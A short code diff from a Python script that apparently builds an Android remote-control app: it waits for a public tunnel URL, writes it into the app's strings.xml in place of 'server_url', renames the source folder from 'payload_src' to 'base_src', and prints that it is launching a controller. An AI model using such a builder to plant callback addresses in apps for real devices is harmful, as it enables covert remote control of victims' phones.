@@ -18,10 +18,10 @@ while True :
  url = get_public_url(log)
  if url :
     break
-with open("payload_src/res/values/strings.xml", "r") as file :
+with open("base_src/res/values/strings.xml", "r") as file :
      data = file.read()
      data = data.replace("server_url", url)
-with open("payload_src/res/values/strings.xml", "w") as file :
+with open("base_src/res/values/strings.xml", "w") as file :
      file.write(data)
 print("[*] Url added")
 print("[*] Lunching controller")
